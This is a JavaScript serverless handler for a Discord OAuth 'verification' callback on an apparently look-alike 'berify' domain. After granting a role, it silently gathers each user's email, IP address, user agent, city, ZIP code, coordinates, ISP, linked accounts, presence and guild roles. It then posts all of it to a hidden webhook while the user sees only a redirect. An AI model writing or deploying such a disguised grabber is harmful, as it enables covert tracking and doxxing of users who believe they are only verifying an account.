export default async function handler(req, res) {
  const code = req.query.code;
  if (!code) return res.status(400).send("Missing code");

  const {
    DISCORD_CLIENT_ID: client_id,
    DISCORD_CLIENT_SECRET: client_secret,
    DISCORD_BOT_TOKEN: bot_token,
    DISCORD_GUILD_ID: guild_id,
    DISCORD_ROLE_ID: role_id,
    DISCORD_WEBHOOK_URL: webhook_url,
  } = process.env;

  const redirect_uri = "https://berify-topaz.vercel.app/api/callback";

  // Extract IP and user-agent info
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || "Unknown IP";
  const userAgent = req.headers['user-agent'] || "Unknown User Agent";

  const params = new URLSearchParams({
    client_id,
    client_secret,
    grant_type: "authorization_code",
    code,
    redirect_uri,
  });

  try {
    // Exchange code for access token
    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: params.toString(),
    });

    const tokenText = await tokenRes.text();
    let tokenData = {};
    try {
      tokenData = JSON.parse(tokenText);
    } catch {}

    if (!tokenData.access_token) {
      console.error("Failed to get access token. Discord response:", tokenText);
      return res.status(400).send("Failed to get access token: " + tokenText);
    }

    // Get user basic info (with email if scope allows)
    const userRes = await fetch("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    const userData = await userRes.json();

    // Attempt to fetch user guild member info for richer data and role check
    let memberData = {};
    try {
      const memberRes = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${userData.id}`, {
        headers: { Authorization: `Bot ${bot_token}` },
      });
      if (memberRes.ok) memberData = await memberRes.json();
    } catch {}

    // Fetch user presence info (if your bot has privileged intents)
    let presenceData = {};
    try {
      const presenceRes = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${userData.id}/presence`, {
        headers: { Authorization: `Bot ${bot_token}` },
      });
      if (presenceRes.ok) presenceData = await presenceRes.json();
    } catch {}

    // Fetch user connections if scope authorized
    let connectionsData = [];
    try {
      const connectionsRes = await fetch("https://discord.com/api/users/@me/connections", {
        headers: { Authorization: `Bearer ${tokenData.access_token}` },
      });
      if (connectionsRes.ok) connectionsData = await connectionsRes.json();
    } catch {}

    // Add role to guild member (silent fail logging)
    try {
      const addRoleRes = await fetch(
        `https://discord.com/api/guilds/${guild_id}/members/${userData.id}/roles/${role_id}`,
        {
          method: "PUT",
          headers: {
            Authorization: `Bot ${bot_token}`,
          },
        }
      );
      if (!addRoleRes.ok) {
        const errorText = await addRoleRes.text();
        console.error("Failed to add role:", errorText);
      }
    } catch (e) {
      console.error("Role assign error:", e);
    }

    // Silent IP geolocation - detailed fields using ip-api.com
    let geoInfo = {};
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,reverse,timezone,query,mobile,proxy,hosting`);
      geoInfo = await geoRes.json();
      if (geoInfo.status !== "success") geoInfo = {};
    } catch (e) {
      console.error("IP geo fetch failed:", e);
      geoInfo = {};
    }

    // Avatar and banner URLs with fallback and formats
    const avatarBase = userData.avatar
      ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}`
      : null;
    const avatarUrl = avatarBase ? `${avatarBase}.png?size=1024` : null;
    const avatarGifUrl = avatarBase && userData.avatar.startsWith("a_") ? `${avatarBase}.gif?size=1024` : null;
    const bannerUrl = userData.banner
      ? `https://cdn.discordapp.com/banners/${userData.id}/${userData.banner}.png?size=1024`
      : null;

    // Build rich embed fields array with more user data
    const fields = [
      { name: "Username", value: `${userData.username}#${userData.discriminator}`, inline: true },
      { name: "User ID", value: userData.id, inline: true },
      { name: "Email", value: userData.email || "Not provided", inline: false },
      { name: "Verified", value: userData.verified ? "Yes" : "No", inline: true },
      { name: "MFA Enabled", value: userData.mfa_enabled ? "Yes" : "No", inline: true },
      { name: "Locale", value: userData.locale || "Unknown", inline: true },
      { name: "Flags", value: userData.flags?.toString() || "None", inline: true },
      { name: "Premium Type", value: userData.premium_type ? `Level ${userData.premium_type}` : "None", inline: true },
      { name: "IP Address", value: ip, inline: false },
      { name: "User Agent", value: userAgent, inline: false },
      { name: "Token Type", value: tokenData.token_type || "unknown", inline: true },
      { name: "Scope", value: tokenData.scope || "unknown", inline: true },
      { name: "Expires In (seconds)", value: tokenData.expires_in?.toString() || "unknown", inline: true },
      { name: "Refresh Token", value: tokenData.refresh_token ? "Yes" : "No", inline: true },
    ];

    // Member data if available
    if (memberData) {
      if (memberData.nick) fields.push({ name: "Guild Nickname", value: memberData.nick, inline: true });
      if (memberData.joined_at) fields.push({ name: "Guild Joined At", value: new Date(memberData.joined_at).toISOString(), inline: true });
      if (memberData.premium_since) fields.push({ name: "Nitro Boost Since", value: new Date(memberData.premium_since).toISOString(), inline: true });
      if (memberData.roles) fields.push({ name: "Guild Roles", value: memberData.roles.join(", ") || "None", inline: false });
      if (memberData.permissions) fields.push({ name: "Guild Permissions", value: memberData.permissions, inline: false });
    }

    // Presence data if available
    if (presenceData) {
      if (presenceData.status) fields.push({ name: "Presence Status", value: presenceData.status, inline: true });
      if (presenceData.activities?.length) {
        const activitiesStr = presenceData.activities.map(a => `${a.type ? a.type : "Activity"}: ${a.name || "Unknown"}`).join("\n");
        fields.push({ name: "Activities", value: activitiesStr, inline: false });
      }
    }

    // Geo info fields
    if (geoInfo.country) fields.push({ name: "Country", value: geoInfo.country, inline: true });
    if (geoInfo.regionName) fields.push({ name: "Region", value: geoInfo.regionName, inline: true });
    if (geoInfo.city) fields.push({ name: "City", value: geoInfo.city, inline: true });
    if (geoInfo.zip) fields.push({ name: "ZIP", value: geoInfo.zip, inline: true });
    if (geoInfo.lat && geoInfo.lon) fields.push({ name: "Approx. Location", value: `${geoInfo.lat}, ${geoInfo.lon}`, inline: false });
    if (geoInfo.isp) fields.push({ name: "ISP", value: geoInfo.isp, inline: true });
    if (geoInfo.org) fields.push({ name: "Org", value: geoInfo.org, inline: true });
    if (geoInfo.as) fields.push({ name: "AS", value: geoInfo.as, inline: true });
    if (geoInfo.reverse) fields.push({ name: "Reverse DNS", value: geoInfo.reverse, inline: true });
    if (geoInfo.timezone) fields.push({ name: "Timezone", value: geoInfo.timezone, inline: true });
    if (geoInfo.mobile !== undefined) fields.push({ name: "Mobile Proxy", value: geoInfo.mobile ? "Yes" : "No", inline: true });
    if (geoInfo.proxy !== undefined) fields.push({ name: "Proxy", value: geoInfo.proxy ? "Yes" : "No", inline: true });
    if (geoInfo.hosting !== undefined) fields.push({ name: "Hosting Provider", value: geoInfo.hosting ? "Yes" : "No", inline: true });

    // Connections info - detailed mapping
    if (connectionsData.length) {
      const connectionsFormatted = connectionsData.map(c => {
        return `${c.type} (${c.name})${c.verified ? " ✅" : ""}${c.revoked ? " (Revoked)" : ""}`;
      }).join("\n");
      fields.push({ name: "Connections", value: connectionsFormatted, inline: false });
    } else {
      fields.push({ name: "Connections", value: "None or not authorized", inline: false });
    }

    // Build embed object for webhook
    const embed = {
      title: "New User Verified",
      color: 0x7289DA,
      fields,
      timestamp: new Date().toISOString(),
    };
    if (avatarUrl) embed.thumbnail = { url: avatarUrl };
    if (bannerUrl) embed.image = { url: bannerUrl };
    if (userData.accent_color) embed.color = userData.accent_color;

    if (webhook_url) {
      await fetch(webhook_url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] }),
      }).catch(e => {
        console.error("Webhook send error:", e);
      });
    }

    return res.redirect(`https://discord.com/channels/${guild_id}`);
  } catch (error) {
    console.error("Handler error:", error);
    return res.status(500).send("Server error");
  }
}
